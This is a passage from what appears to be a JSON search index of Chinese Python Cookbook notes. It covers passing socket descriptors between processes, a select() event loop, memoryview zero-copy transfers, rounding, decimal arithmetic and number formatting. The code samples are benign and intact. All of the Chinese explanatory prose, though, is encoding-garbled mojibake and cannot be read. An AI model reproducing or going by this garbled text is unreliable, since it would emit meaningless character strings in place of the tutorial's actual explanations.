çš„ä¾‹å­æ¼”ç¤ºäº†æœ€åŸºæœ¬çš„ç”¨æ³•: import multiprocessing from multiprocessing.reduction import recv_handle, send_handle import socket def worker(in_p, out_p): out_p.close() while True: fd = recv_handle(in_p) print('CHILD: GOT FD', fd) with socket.socket(socket.AF_INET, socket.SOCK_STREAM, fileno=fd) as s: while True: msg = s.recv(1024) if not msg: break print('CHILD: RECV {!r}'.format(msg)) s.send(msg) def server(address, in_p, out_p, worker_pid): in_p.close() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True) s.bind(address) s.listen(1) while True: client, addr = s.accept() print('SERVER: Got connection from', addr) send_handle(out_p, client.fileno(), worker_pid) client.close() if __name__ == '__main__': c1, c2 = multiprocessing.Pipe() worker_p = multiprocessing.Process(target=worker, args=(c1,c2)) worker_p.start() server_p = multiprocessing.Process(target=server, args=(('', 15000), c1, c2, worker_p.pid)) server_p.start() c1.close() c2.close() åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä¸¤ä¸ªè¿›ç¨‹è¢«åˆ›å»ºå¹¶é€šè¿‡ä¸€ä¸ª multiprocessing ç®¡é“è¿æ¥èµ·æ¥ã€‚æœ åŠ¡å™¨è¿›ç¨‹æ‰“å¼€ä¸€ä¸ª socket å¹¶ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥è¯·æ±‚ã€‚å·¥ä½œè¿›ç¨‹ä»…ä»…ä½¿ç”¨ recv_handle() åœ¨ç®¡é“ä¸Šé¢ç­‰å¾…æ¥æ”¶ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚å½“æœåŠ¡å™¨æ¥æ”¶åˆ°ä¸€ä¸ªè¿æ¥ï¼Œå®ƒå°†äº§ç”Ÿçš„ socket æ–‡ä»¶æè¿°ç¬¦é€šè¿‡ send_handle() ä¼ é€’ç»™å·¥ä½œè¿›ç¨‹ã€‚å·¥ä½œè¿›ç¨‹æ¥æ”¶åˆ° socket åå‘å®¢æˆ·ç«¯ å›åº”æ•°æ®ï¼Œç„¶åæ­¤æ¬¡è¿æ¥å…³é—­ã€‚ è®¨è®º å¯¹äºå¤§éƒ¨åˆ†ç¨‹åºå‘˜æ¥è®²åœ¨ä¸åŒè¿›ç¨‹ä¹‹é—´ä¼ é€’æ–‡ä»¶æè¿°ç¬¦å¥½åƒæ²¡ä»€ä¹ˆå¿…è¦ã€‚ä½†æ˜¯ï¼Œæœ‰ æ—¶å€™å®ƒæ˜¯æ„å»ºä¸€ä¸ªå¯æ‰©å±•ç³»ç»Ÿçš„å¾ˆæœ‰ç”¨çš„å·¥å…·ã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸€ä¸ªå¤šæ ¸æœºå™¨ä¸Šé¢ï¼Œä½ å¯ä»¥æœ‰ å¤šä¸ª Python è§£é‡Šå™¨å®ä¾‹ï¼Œå°†æ–‡ä»¶æè¿°ç¬¦ä¼ é€’ç»™å…¶å®ƒè§£é‡Šå™¨æ¥å®ç°è´Ÿè½½å‡è¡¡ã€‚ send_handle() å’Œ recv_handle() å‡½æ•°åªèƒ½å¤Ÿç”¨äº multiprocessing è¿æ¥ã€‚ ç†è§£äº‹ä»¶é©±åŠ¨çš„ IO é—®é¢˜ ä½ åº”è¯¥å·²ç»å¬è¿‡åŸºäºäº‹ä»¶é©±åŠ¨æˆ–å¼‚æ­¥ I/O çš„åŒ…ï¼Œä½†æ˜¯ä½ è¿˜ä¸èƒ½å®Œå…¨ç†è§£å®ƒçš„åº•å±‚ åˆ°åº•æ˜¯æ€æ ·å·¥ä½œçš„ï¼Œæˆ–è€…æ˜¯å¦‚æœä½¿ç”¨å®ƒçš„è¯ä¼šå¯¹ä½ çš„ç¨‹åºäº§ç”Ÿä»€ä¹ˆå½±å“ã€‚ è§£å†³æ–¹æ¡ˆ äº‹ä»¶é©±åŠ¨ I/O æœ¬è´¨ä¸Šæ¥è®²å°±æ˜¯å°†åŸºæœ¬ I/O æ“ä½œï¼ˆæ¯”å¦‚è¯»å’Œå†™ï¼‰è½¬åŒ–ä¸ºä½ ç¨‹åºéœ€è¦ å¤„ç†çš„äº‹ä»¶ã€‚ä¾‹å¦‚ï¼Œå½“æ•°æ®åœ¨æŸä¸ª socket ä¸Šè¢«æ¥å—åï¼Œå®ƒä¼šè½¬æ¢æˆä¸€ä¸ª receive äº‹ä»¶ï¼Œ ç„¶åè¢«ä½ å®šä¹‰çš„å›è°ƒæ–¹æ³•æˆ–å‡½æ•°æ¥å¤„ç†ã€‚ä½œä¸ºä¸€ä¸ªå¯èƒ½çš„èµ·å§‹ç‚¹ï¼Œä¸€ä¸ªäº‹ä»¶é©±åŠ¨çš„æ¡†æ¶ å¯èƒ½ä¼šä»¥ä¸€ä¸ªå®ç°äº†ä¸€ç³»åˆ—åŸºæœ¬äº‹ä»¶å¤„ç†å™¨æ–¹æ³•çš„åŸºç±»å¼€å§‹: class EventHandler: def fileno(self): 'Return the associated file descriptor' raise NotImplemented('must implement') def wants_to_receive(self): 'Return True if receiving is allowed' return False def handle_receive(self): 'Perform the receive operation' pass def wants_to_send(self): 'Return True if sending is requested' return False def handle_send(self): 'Send outgoing data' pass è¿™ä¸ªç±»çš„å®ä¾‹ä½œä¸ºæ’ä»¶è¢«æ”¾å…¥ç±»ä¼¼ä¸‹é¢è¿™æ ·çš„äº‹ä»¶å¾ªç¯ä¸­: import select def event_loop(handlers): while True: wants_recv = [h for h in handlers if h.wants_to_receive()] wants_send = [h for h in handlers if h.wants_to_send()] can_recv, can_send, _ = select.select(wants_recv, wants_send, []) for h in can_recv: h.handle_receive() for h in can_send: h.handle_send() äº‹ä»¶å¾ªç¯çš„å…³é”®éƒ¨åˆ†æ˜¯ select() è°ƒç”¨ï¼Œå®ƒä¼šä¸æ–­è½®è¯¢æ–‡ä»¶æè¿°ç¬¦ä»è€Œæ¿€æ´»å®ƒã€‚åœ¨ è°ƒç”¨ select() ä¹‹å‰ï¼Œæ—¶é—´å¾ªç¯ä¼šè¯¢é—®æ‰€æœ‰çš„å¤„ç†å™¨æ¥å†³å®šå“ªä¸€ä¸ªæƒ³æ¥å—æˆ–å‘ç”Ÿã€‚ç„¶å å®ƒå°†ç»“æœåˆ—è¡¨æä¾›ç»™ select() ã€‚ç„¶å select() è¿”å›å‡†å¤‡æ¥å—æˆ–å‘é€çš„å¯¹è±¡ç»„æˆçš„åˆ— è¡¨ã€‚ç„¶åç›¸åº”çš„ handle_receive() æˆ– handle_send() æ–¹æ³•è¢«è§¦å‘ã€‚ è®¨è®º å®é™…ä¸Šæ‰€æœ‰çš„äº‹ä»¶é©±åŠ¨æ¡†æ¶åŸç†è·Ÿä¸Šé¢çš„ä¾‹å­ç›¸å·®æ— å‡ ã€‚å®é™…çš„å®ç°ç»†èŠ‚å’Œè½¯ä»¶ æ¶æ„å¯èƒ½ä¸ä¸€æ ·ï¼Œä½†æ˜¯åœ¨æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼Œéƒ½ä¼šæœ‰ä¸€ä¸ªè½®è¯¢çš„å¾ªç¯æ¥æ£€æŸ¥æ´»åŠ¨ socketï¼Œå¹¶ æ‰§è¡Œå“åº”æ“ä½œ. äº‹ä»¶é©±åŠ¨ I/O çš„ä¸€ä¸ªå¯èƒ½å¥½å¤„æ˜¯å®ƒèƒ½å¤„ç†éå¸¸å¤§çš„å¹¶å‘è¿æ¥ï¼Œè€Œä¸éœ€è¦ä½¿ç”¨å¤šçº¿ ç¨‹æˆ–å¤šè¿›ç¨‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œselect() è°ƒç”¨ï¼ˆæˆ–å…¶ä»–ç­‰æ•ˆçš„ï¼‰èƒ½ç›‘å¬å¤§é‡çš„ socket å¹¶å“åº” å®ƒä»¬ä¸­ä»»ä½•ä¸€ä¸ªäº§ç”Ÿäº‹ä»¶çš„ã€‚åœ¨å¾ªç¯ä¸­ä¸€æ¬¡å¤„ç†ä¸€ä¸ªäº‹ä»¶ï¼Œå¹¶ä¸éœ€è¦å…¶ä»–çš„å¹¶å‘æœºåˆ¶ã€‚ äº‹ä»¶é©±åŠ¨ I/O çš„ç¼ºç‚¹æ˜¯æ²¡æœ‰çœŸæ­£çš„åŒæ­¥æœºåˆ¶ã€‚å¦‚æœä»»ä½•äº‹ä»¶å¤„ç†å™¨æ–¹æ³•é˜»å¡æˆ–æ‰§ è¡Œä¸€ä¸ªè€—æ—¶è®¡ç®—ï¼Œå®ƒä¼šé˜»å¡æ‰€æœ‰çš„å¤„ç†è¿›ç¨‹ã€‚è°ƒç”¨é‚£äº›å¹¶ä¸æ˜¯äº‹ä»¶é©±åŠ¨é£æ ¼çš„åº“å‡½æ•°ä¹Ÿ ä¼šæœ‰é—®é¢˜ï¼ŒåŒæ ·è¦æ˜¯æŸäº›åº“å‡½æ•°è°ƒç”¨ä¼šé˜»å¡ï¼Œé‚£ä¹ˆä¹Ÿä¼šå¯¼è‡´æ•´ä¸ªäº‹ä»¶å¾ªç¯åœæ­¢ã€‚ å¯¹äºé˜»å¡æˆ–è€—æ—¶è®¡ç®—çš„é—®é¢˜å¯ä»¥é€šè¿‡å°†äº‹ä»¶å‘é€ä¸ªå…¶ä»–å•ç‹¬çš„çº¿ç¨‹æˆ–è¿›ç¨‹æ¥å¤„ç†ã€‚ ä¸è¿‡ï¼Œåœ¨äº‹ä»¶å¾ªç¯ä¸­å¼•å…¥å¤šçº¿ç¨‹å’Œå¤šè¿›ç¨‹æ˜¯æ¯”è¾ƒæ£˜æ‰‹çš„ï¼Œä¸‹é¢çš„ä¾‹å­æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ concurrent.futures æ¨¡å—æ¥å®ç°: self.pool = ThreadPoolExecutor(nworkers) r = self.pool.submit(func, *args, **kwargs) r.add_done_callback(lambda r: self._complete(callback, r)) å·¥ä½œè¢«æäº¤ç»™ ThreadPoolExecutor å®ä¾‹ã€‚ä¸è¿‡ä¸€ä¸ªéš¾ç‚¹æ˜¯åè°ƒè®¡ç®—ç»“æœå’Œäº‹ä»¶å¾ªç¯: # Callback that executes when the thread is done def _complete(self, callback, r): self.pending.append((callback, r.result())) self.signal_done_sock.send(b'x') å‘é€ä¸æ¥æ”¶å¤§å‹æ•°ç»„ é—®é¢˜ ä½ è¦é€šè¿‡ç½‘ç»œè¿æ¥å‘é€å’Œæ¥å—è¿ç»­æ•°æ®çš„å¤§å‹æ•°ç»„ï¼Œå¹¶å°½é‡å‡å°‘æ•°æ®çš„å¤åˆ¶æ“ä½œ è§£å†³æ–¹æ¡ˆ ä¸‹é¢çš„å‡½æ•°åˆ©ç”¨ memoryviews æ¥å‘é€å’Œæ¥å—å¤§æ•°ç»„: # zerocopy.py def send_from(arr, dest): view = memoryview(arr).cast('B') while len(view): nsent = dest.send(view) view = view[nsent:] def recv_into(arr, source): view = memoryview(arr).cast('B') while len(view): nrecv = source.recv_into(view) view = view[nrecv:] è®¨è®º åœ¨æ•°æ®å¯†é›†å‹åˆ†å¸ƒå¼è®¡ç®—å’Œå¹³è¡Œè®¡ç®—ç¨‹åºä¸­ï¼Œè‡ªå·±å†™ç¨‹åºæ¥å®ç°å‘é€/æ¥å—å¤§é‡æ•° æ®å¹¶ä¸å¸¸è§ã€‚ä¸è¿‡ï¼Œè¦æ˜¯ä½ ç¡®å®æƒ³è¿™æ ·åšï¼Œä½ å¯èƒ½éœ€è¦å°†ä½ çš„æ•°æ®è½¬æ¢æˆåŸå§‹å­—èŠ‚ï¼Œä»¥ ä¾¿ç»™ä½å±‚çš„ç½‘ç»œå‡½æ•°ä½¿ç”¨ã€‚ä½ å¯èƒ½è¿˜éœ€è¦å°†æ•°æ®åˆ‡å‰²æˆå¤šä¸ªå—ï¼Œå› ä¸ºå¤§éƒ¨åˆ†å’Œç½‘ç»œç›¸å…³ çš„å‡½æ•°å¹¶ä¸èƒ½ä¸€æ¬¡æ€§å‘é€æˆ–æ¥å—è¶…å¤§æ•°æ®å—ã€‚ ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨æŸç§æœºåˆ¶åºåˆ—åŒ–æ•°æ®â€”â€”å¯èƒ½å°†å…¶è½¬æ¢æˆä¸€ä¸ªå­—èŠ‚å­—ç¬¦ä¸²ã€‚ä¸è¿‡ï¼Œ è¿™æ ·æœ€ç»ˆä¼šåˆ›å»ºæ•°æ®çš„ä¸€ä¸ªå¤åˆ¶ã€‚å°±ç®—ä½ åªæ˜¯é›¶ç¢çš„åšè¿™äº›ï¼Œä½ çš„ä»£ç æœ€ç»ˆè¿˜æ˜¯ä¼šæœ‰å¤§ é‡çš„å°å‹å¤åˆ¶æ“ä½œã€‚ æœ¬è´¨ä¸Šï¼Œä¸€ä¸ªå†…å­˜è§†å›¾å°±æ˜¯ä¸€ä¸ªå·²å­˜ åœ¨æ•°ç»„çš„è¦†ç›–å±‚ã€‚å†…å­˜è§†å›¾è¿˜èƒ½ä»¥ä¸åŒçš„æ–¹å¼è½¬æ¢æˆä¸åŒç±»å‹æ¥è¡¨ç°æ•°æ®: view = memoryview(arr).cast('B') å®ƒæ¥å—ä¸€ä¸ªæ•°ç»„ arr å¹¶å°†å…¶è½¬æ¢ä¸ºä¸€ä¸ªæ— ç¬¦å·å­—èŠ‚çš„å†…å­˜è§†å›¾ã€‚è¿™ä¸ªè§†å›¾èƒ½è¢«ä¼ é€’ ç»™ socket ç›¸å…³å‡½æ•°ï¼Œæ¯”å¦‚ socket.send() æˆ– send.recv_into() ã€‚åœ¨å†…éƒ¨ï¼Œè¿™äº›æ–¹æ³• èƒ½å¤Ÿç›´æ¥æ“ä½œè¿™ä¸ªå†…å­˜åŒºåŸŸã€‚ä¾‹å¦‚ï¼Œsock.send() ç›´æ¥ä»å†…å­˜ä¸­å‘ç”Ÿæ•°æ®è€Œä¸éœ€è¦å¤ åˆ¶ã€‚send.recv_into() ä½¿ç”¨è¿™ä¸ªå†…å­˜åŒºåŸŸä½œä¸ºæ¥å—æ“ä½œçš„è¾“å…¥ç¼“å†²åŒº å‰©ä¸‹çš„ä¸€ä¸ªéš¾ç‚¹å°±æ˜¯ socket å‡½æ•°å¯èƒ½åªæ“ä½œéƒ¨åˆ†æ•°æ®ã€‚é€šå¸¸æ¥è®²ï¼Œæˆ‘ä»¬å¾—ä½¿ç”¨å¾ˆ å¤šä¸åŒçš„ send() å’Œ recv_into() æ¥ä¼ è¾“æ•´ä¸ªæ•°ç»„ã€‚ä¸ç”¨æ‹…å¿ƒï¼Œæ¯æ¬¡æ“ä½œåï¼Œè§†å›¾ä¼šé€š è¿‡å‘é€æˆ–æ¥å—å­—èŠ‚æ•°é‡è¢«åˆ‡å‰²æˆæ–°çš„è§†å›¾ã€‚æ–°çš„è§†å›¾åŒæ ·ä¹Ÿæ˜¯å†…å­˜è¦†ç›–å±‚ã€‚å› æ­¤ï¼Œè¿˜æ˜¯ æ²¡æœ‰ä»»ä½•çš„å¤åˆ¶æ“ä½œ. è¿™é‡Œæœ‰ä¸ªé—®é¢˜å°±æ˜¯æ¥å—è€…å¿…é¡»äº‹å…ˆçŸ¥é“æœ‰å¤šå°‘æ•°æ®è¦è¢«å‘é€ï¼Œä»¥ä¾¿å®ƒèƒ½é¢„åˆ†é…ä¸€ ä¸ªæ•°ç»„æˆ–è€…ç¡®ä¿å®ƒèƒ½å°†æ¥å—çš„æ•°æ®æ”¾å…¥ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ•°ç»„ä¸­ã€‚å¦‚æœæ²¡åŠæ³•çŸ¥é“çš„è¯ï¼Œ å‘é€è€…å°±å¾—å…ˆå°†æ•°æ®å¤§å°å‘é€è¿‡æ¥ï¼Œç„¶åå†å‘é€å®é™…çš„æ•°ç»„æ•°æ®ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-cookbook-Network-and-web-programming.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Network-and-web-programming.html"},{"title":"æ•°å­—/æ—¥æœŸ/æ—¶é—´","text":"æ•°å­—çš„å››èˆäº”å…¥ round(value, ndigits), ä¸è¿‡å½“å–æ•°çš„å€¼ä¸º5æ—¶æœ‰ç‚¹ç‰¹æ®Š, è§ /docs/åç«¯/python/å†…ç½®å‡½æ•°/round å½“ä¸€ä¸ªå€¼åˆšå¥½åœ¨ä¸¤ä¸ªè¾¹ç•Œçš„ä¸­é—´çš„æ—¶å€™ï¼Œround å‡½æ•°è¿”å›ç¦»å®ƒæœ€è¿‘çš„å¶æ•°ã€‚ä¹Ÿå°±æ˜¯ è¯´ï¼Œå¯¹ 1.5 æˆ–è€… 2.5 çš„èˆå…¥è¿ç®—éƒ½ä¼šå¾—åˆ° 2ã€‚ ä¼ ç»™ round() å‡½æ•°çš„ ndigits å‚æ•°å¯ä»¥æ˜¯è´Ÿæ•°ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œèˆå…¥è¿ç®—ä¼šä½œç”¨åœ¨ åä½ã€ç™¾ä½ã€åƒä½ç­‰ä¸Šé¢ã€‚æ¯”å¦‚: >>> a = 1627731 >>> round(a, -1) 1627730 >>> round(a, -2) 1627700 >>> round(a, -3) 1628000 >>> å¦‚æœä½ çš„ç›®çš„åªæ˜¯ç®€å•çš„è¾“å‡ºä¸€å®šå®½åº¦çš„æ•°ï¼Œ ä½ ä¸éœ€è¦ä½¿ç”¨ round() å‡½æ•°ã€‚è€Œä»…ä»…åªéœ€è¦åœ¨æ ¼å¼åŒ–çš„æ—¶å€™æŒ‡å®šç²¾åº¦å³å¯: >>> x = 1.23456 >>> format(x, '0.2f') '1.23' >>> format(x, '0.3f') '1.235' >>> 'value is {:0.3f}'.format(x) 'value is 1.235' >>> ä¸è¦è¯•ç€å»èˆå…¥æµ®ç‚¹å€¼æ¥\"ä¿®æ­£\"è¡¨é¢ä¸Šçœ‹èµ·æ¥æ­£ç¡®çš„é—®é¢˜ã€‚æ¯”å¦‚ï¼Œä½ å¯èƒ½ å€¾å‘äºè¿™æ ·åš: >>> a = 2.1 >>> b = 4.2 >>> c = a + b >>> c 6.300000000000001 >>> c = round(c, 2) # \"Fix\" result (???) >>> c 6.3 >>> å¯¹äºå¤§å¤šæ•°ä½¿ç”¨åˆ°æµ®ç‚¹çš„ç¨‹åºï¼Œæ²¡æœ‰å¿…è¦ä¹Ÿä¸æ¨èè¿™æ ·åšã€‚ å°½ç®¡åœ¨è®¡ç®—çš„æ—¶å€™ä¼šæœ‰ ä¸€ç‚¹ç‚¹å°çš„è¯¯å·®ï¼Œä½†æ˜¯è¿™äº›å°çš„è¯¯å·®æ˜¯èƒ½è¢«ç†è§£ä¸å®¹å¿çš„ã€‚ å¦‚æœä¸èƒ½å…è®¸è¿™æ ·çš„å°è¯¯å·® (æ¯”å¦‚æ¶‰åŠåˆ°é‡‘èé¢†åŸŸ)ï¼Œé‚£ä¹ˆå°±å¾—è€ƒè™‘ä½¿ç”¨ decimal æ¨¡å—äº† ç²¾ç¡®çš„æµ®ç‚¹æ•°è¿ç®— decimal math éœ€è¦å¯¹æµ®ç‚¹æ•°æ‰§è¡Œç²¾ç¡®çš„è®¡ç®—æ“ä½œï¼Œå¹¶ä¸”ä¸å¸Œæœ›æœ‰ä»»ä½•å°è¯¯å·®çš„å‡ºç° æµ®ç‚¹æ•°çš„ä¸€ä¸ªæ™®éé—®é¢˜æ˜¯å®ƒä»¬å¹¶ä¸èƒ½ç²¾ç¡®çš„è¡¨ç¤ºåè¿›åˆ¶æ•°ã€‚å¹¶ä¸”ï¼Œå³ä½¿æ˜¯æœ€ç®€å•çš„ æ•°å­¦è¿ç®—ä¹Ÿä¼šäº§ç”Ÿå°çš„è¯¯å·®ï¼Œæ¯”å¦‚: >>> a = 4.2 >>> b = 2.1 >>> a + b 6.300000000000001 >>> (a + b) == 6.3 False >>> è¿™äº›é”™è¯¯æ˜¯ç”±åº•å±‚ CPU å’Œ IEEE 754 æ ‡å‡†é€šè¿‡è‡ªå·±çš„æµ®ç‚¹å•ä½å»æ‰§è¡Œç®—æœ¯æ—¶çš„ç‰¹ å¾ã€‚ ç”±äº Python çš„æµ®ç‚¹æ•°æ®ç±»å‹ä½¿ç”¨åº•å±‚è¡¨ç¤ºå­˜å‚¨æ•°æ®ï¼Œå› æ­¤ä½ æ²¡åŠæ³•å»é¿å…è¿™æ ·çš„ è¯¯å·®ã€‚ å¦‚æœä½ æƒ³æ›´åŠ ç²¾ç¡® (å¹¶èƒ½å®¹å¿ä¸€å®šçš„æ€§èƒ½æŸè€—)ï¼Œä½ å¯ä»¥ä½¿ç”¨ decimal æ¨¡å—: >>> from decimal import Decimal >>> a = Decimal('4.2') >>> b = Decimal('2.1') >>> a + b Decimal('6.3') >>> print(a + b) 6.3 >>> (a + b) == Decimal('6.3') True æœ‰ä¸ªçœ‹èµ·æ¥æ¯”è¾ƒå¥‡æ€ªçš„æ˜¯ ç”¨å­—ç¬¦ä¸²æ¥è¡¨ç¤ºæ•°å­—. decimal æ¨¡å—çš„ä¸€ä¸ªä¸»è¦ç‰¹å¾æ˜¯å…è®¸ä½ æ§åˆ¶è®¡ç®—çš„æ¯ä¸€æ–¹é¢ï¼ŒåŒ…æ‹¬æ•°å­—ä½æ•°å’Œå›› èˆäº”å…¥è¿ç®—ã€‚ ä¸ºäº†è¿™æ ·åšï¼Œä½ å…ˆå¾—åˆ›å»ºä¸€ä¸ªæœ¬åœ°ä¸Šä¸‹æ–‡å¹¶æ›´æ”¹å®ƒçš„è®¾ç½®: >>> from decimal import localcontext >>> a = Decimal('1.3') >>> b = Decimal('1.7') >>> print(a / b) 0.7647058823529411764705882353 >>> with localcontext() as ctx: ... ctx.prec = 3 ... print(a / b) ... 0.765 >>> with localcontext() as ctx: ... ctx.prec = 50 ... print(a / b) ... 0.76470588235294117647058823529411764705882352941176 >>> æ–°æ‰‹ä¼šå€¾å‘äºä½¿ç”¨ decimal æ¨¡å—æ¥å¤„ç†æµ®ç‚¹æ•°çš„ç²¾ç¡®è¿ç®—ã€‚ ç„¶è€Œï¼Œå…ˆç†è§£ ä½ çš„åº”ç”¨ç¨‹åºç›®çš„æ˜¯éå¸¸é‡è¦çš„ã€‚ å¦‚æœä½ æ˜¯åœ¨åšç§‘å­¦è®¡ç®—æˆ–å·¥ç¨‹é¢†åŸŸçš„è®¡ç®—ã€ç”µè„‘ç»˜ å›¾ï¼Œæˆ–è€…æ˜¯ç§‘å­¦é¢†åŸŸçš„å¤§å¤šæ•°è¿ç®—ï¼Œé‚£ä¹ˆä½¿ç”¨æ™®é€šçš„æµ®ç‚¹ç±»å‹æ˜¯æ¯”è¾ƒæ™®éçš„åšæ³•ã€‚ å…¶ä¸­ ä¸€ä¸ªåŸå› æ˜¯ï¼Œåœ¨çœŸå®ä¸–ç•Œä¸­å¾ˆå°‘ä¼šè¦æ±‚ç²¾ç¡®åˆ°æ™®é€šæµ®ç‚¹æ•°èƒ½æä¾›çš„ 17 ä½ç²¾åº¦ã€‚ å› æ­¤ï¼Œ è®¡ç®—è¿‡ç¨‹ä¸­çš„é‚£ä¹ˆä¸€ç‚¹ç‚¹çš„è¯¯å·®æ˜¯è¢«å…è®¸çš„ã€‚ ç¬¬äºŒç‚¹å°±æ˜¯ï¼ŒåŸç”Ÿçš„æµ®ç‚¹æ•°è®¡ç®—è¦å¿«çš„ å¤š-æœ‰æ—¶å€™ä½ åœ¨æ‰§è¡Œå¤§é‡è¿ç®—çš„æ—¶å€™é€Ÿåº¦ä¹Ÿæ˜¯éå¸¸é‡è¦çš„ã€‚ å³ä¾¿å¦‚æ­¤ï¼Œä½ å´ä¸èƒ½å®Œå…¨å¿½ç•¥è¯¯å·®ã€‚ æ•°å­¦å®¶èŠ±äº†å¤§é‡æ—¶é—´å»ç ”ç©¶å„ç±»ç®—æ³•ï¼Œæœ‰äº›å¤„ ç†è¯¯å·®ä¼šæ¯”å…¶ä»–æ–¹æ³•æ›´å¥½ã€‚ä½ ä¹Ÿå¾—æ³¨æ„ä¸‹å‡æ³•åˆ é™¤ä»¥åŠå¤§æ•°å’Œå°æ•°çš„åŠ åˆ†è¿ç®—æ‰€å¸¦æ¥ çš„å½±å“ã€‚æ¯”å¦‚: >>> nums = [1.23e+18, 1, -1.23e+18] >>> sum(nums) # Notice how 1 disappears 0.0 >>> ä¸Šé¢çš„é”™è¯¯å¯ä»¥åˆ©ç”¨ math.fsum() æ‰€æä¾›çš„æ›´ç²¾ç¡®è®¡ç®—èƒ½åŠ›æ¥è§£å†³: >>> import math >>> math.fsum(nums) 1.0 >>> mathè¯¦æƒ…è§: /docs/åç«¯/python/pythonæ ‡å‡†åº“/math ç„¶è€Œï¼Œå¯¹äºå…¶ä»–çš„ç®—æ³•ï¼Œä½ åº”è¯¥ä»”ç»†ç ”ç©¶å®ƒå¹¶ç†è§£å®ƒçš„è¯¯å·®äº§ç”Ÿæ¥æºã€‚ æ€»çš„æ¥è¯´ï¼Œdecimal æ¨¡å—ä¸»è¦ç”¨åœ¨æ¶‰åŠåˆ°é‡‘èçš„é¢†åŸŸã€‚ åœ¨è¿™ç±»ç¨‹åºä¸­ï¼Œå“ªæ€•æ˜¯ä¸€ç‚¹ å°å°çš„è¯¯å·®åœ¨è®¡ç®—è¿‡ç¨‹ä¸­è”“å»¶éƒ½æ˜¯ä¸å…è®¸çš„ã€‚ å› æ­¤ï¼Œdecimal æ¨¡å—ä¸ºè§£å†³è¿™ç±»é—®é¢˜æä¾› äº†æ–¹æ³•ã€‚ å½“ Python å’Œæ•°æ®åº“æ‰“äº¤é“çš„æ—¶å€™ä¹Ÿé€šå¸¸ä¼šé‡åˆ° Decimal å¯¹è±¡ï¼Œå¹¶ä¸”ï¼Œé€šå¸¸ä¹Ÿ æ˜¯åœ¨å¤„ç†é‡‘èæ•°æ®çš„æ—¶å€™ã€‚ æ•°å­—çš„æ ¼å¼åŒ–è¾“å‡º å°†æ•°å­—æ ¼å¼åŒ–åè¾“å‡ºï¼Œå¹¶æ§åˆ¶æ•°å­—çš„ä½æ•°ã€å¯¹é½ã€åƒä½åˆ†éš”ç¬¦å’Œå…¶ä»–çš„ç»†èŠ‚ã€‚ æ ¼å¼åŒ–è¾“å‡ºå•ä¸ªæ•°å­—çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨å†…ç½®çš„ format() å‡½æ•°: >>> x = 1234.56789 >>> # Two decimal places of accuracy >>> format(x, '0.2f') '1234.57' >>> # å³å¯¹é½10ä¸ªå­—ç¬¦ï¼Œä¸€ä½æ•°ç²¾åº¦ >>> format(x, '>10.1f') ' 1234.6' >>> # Left justified >>> format(x, '<10.1f') '1234.6 ' >>> # Centered >>> format(x, '&#94;10.1f') ' 1234.6 ' >>> # Inclusion of thousands separator >>> format(x, ',') '1,234.56789' >>> format(x, '0,.1f') '1,234.6' >>> ä½¿ç”¨æŒ‡æ•°è®°æ³•ï¼Œå°† f æ”¹æˆ e æˆ–è€… E(å–å†³äºæŒ‡æ•°è¾“å‡ºçš„å¤§å°å†™å½¢å¼): >>> format(x, 'e') '1.234568e+03' >>> format(x, '0.2E') '1.23E+03' >>> åŒæ—¶æŒ‡å®šå®½åº¦å’Œç²¾åº¦çš„ä¸€èˆ¬å½¢å¼æ˜¯ '[<>&#94;]?width[,]?(.digits)?' ï¼Œ å…¶ä¸­ width å’Œ digits ä¸ºæ•´æ•°ï¼Œ?ä»£è¡¨å¯é€‰éƒ¨åˆ†ã€‚ åŒæ ·çš„æ ¼å¼ä¹Ÿè¢«ç”¨åœ¨å­—ç¬¦ä¸²çš„ format() æ–¹æ³•ä¸­: >>> 'The value is {:0,.2f}'.format(x) 'The value is 1,234.57' >>> æ•°å­—æ ¼å¼åŒ–è¾“å‡ºé€šå¸¸æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚ä¸Šé¢æ¼”ç¤ºçš„æŠ€æœ¯åŒæ—¶é€‚ç”¨äºæµ®ç‚¹æ•°å’Œdecimal æ¨¡å—ä¸­çš„ Decimal æ•°å­—å¯¹è±¡ã€‚ å½“æŒ‡å®šæ•°å­—çš„ä½æ•°åï¼Œç»“æœå€¼ä¼šæ ¹æ® round() å‡½æ•°åŒæ ·çš„è§„åˆ™è¿›è¡Œå››èˆäº”å…¥åè¿” å›: >>> x 1234.56789 >>> format(x, '0.1f') '1234.6' >>> format(-x, '0.1f') '-1234.6' >>> åŒ…å«åƒä½ç¬¦çš„æ ¼å¼åŒ–è·Ÿæœ¬åœ°åŒ–æ²¡æœ‰å…³ç³»ã€‚å¦‚æœä½ éœ€è¦æ ¹æ®åœ°åŒºæ¥æ˜¾ç¤ºåƒä½ç¬¦ï¼Œä½  éœ€è¦è‡ªå·±å»è°ƒæŸ¥ä¸‹ locale æ¨¡å—ä¸­çš„å‡½æ•°äº†ã€‚ åŒæ ·ä¹Ÿå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²çš„ translate() æ–¹æ³•æ¥äº¤æ¢åƒä½ç¬¦: >>> swap_separators = { ord('.'):',', ord(','):'.' } >>> format(x, ',').translate(swap_separators) '1.234,56789' >>> ä½¿ç”¨ % æ¥æ ¼å¼åŒ–æ•°å­—ä¹Ÿæ˜¯å¯è¡Œçš„ï¼Œä¸è¿‡æ¯”æ›´åŠ å…ˆè¿›çš„ format() è¦å·®ä¸€ç‚¹ã€‚ æ¯”å¦‚ï¼Œåœ¨ä½¿ ç”¨ % æ“ä½œç¬¦æ ¼å¼åŒ–æ•°å­—çš„æ—¶å€™ï¼Œä¸€äº›ç‰¹æ€§ (æ·»åŠ åƒä½ç¬¦) å¹¶ä¸èƒ½è¢«æ”¯æŒ: >>> '%0.2f' % x '1234.57' >>> '%10.1f' % x ' 